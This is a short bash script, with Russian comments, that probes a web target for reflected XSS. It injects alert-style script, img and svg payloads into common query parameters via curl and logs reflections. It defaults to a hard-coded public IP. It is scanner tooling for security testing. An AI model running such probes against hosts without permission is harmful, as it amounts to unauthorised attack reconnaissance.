#!/bin/bash

TARGET_URL="${1:-33.57.84.200}"
RESULTS_FILE="${2:-results.txt}"

BLUE='\033[0;34m'
GREEN='\033[0;32m'
WHITE='\033[0;37m'

log_info() {
    echo -e "${BLUE}[XSS-INFO]${WHITE} $1" | tee -a $RESULTS_FILE
}

log_success() {
    echo -e "${GREEN}[XSS-SUCCESS]${WHITE} $1" | tee -a $RESULTS_FILE
}

log_error() {
    echo -e "${BLUE}[XSS-ERROR]${WHITE} $1" | tee -a $RESULTS_FILE
}

test_reflected_xss() {
    log_info "Тестируем Reflected XSS..."
    
    # XSS payloads
    xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=\"alert('XSS')\">"
        "<svg onload=\"alert('XSS')\">"
    )
    
    # Параметры для тестирования
    params=("q" "search" "id" "name" "message")
    
    for param in "${params[@]}"; do
        for payload in "${xss_payloads[@]}"; do
            # URL encode
            encoded=$(echo -n "$payload" | sed 's/ /%20/g' | sed 's/</\%3C/g' | sed 's/>/\%3E/g' | sed "s/'/%27/g")
            
            url="$TARGET_URL/?$param=$encoded"
            response=$(curl -s "$url" 2>/dev/null)
            
            # Проверяем, отражён ли payload
            if echo "$response" | grep -q "$payload"; then
                log_success "Reflected XSS найден в параметре: $param"
                log_info "  Payload: $payload"
                echo "XSS Parameter: $param" >> $RESULTS_FILE
                echo "XSS Payload: $payload" >> $RESULTS_FILE
            fi
        done
    done
}

main() {
    echo "" | tee -a $RESULTS_FILE
    log_info "===== Тестирование на XSS ====="
    
    test_reflected_xss

    echo "" | tee -a $RESULTS_FILE
}

main "$@"
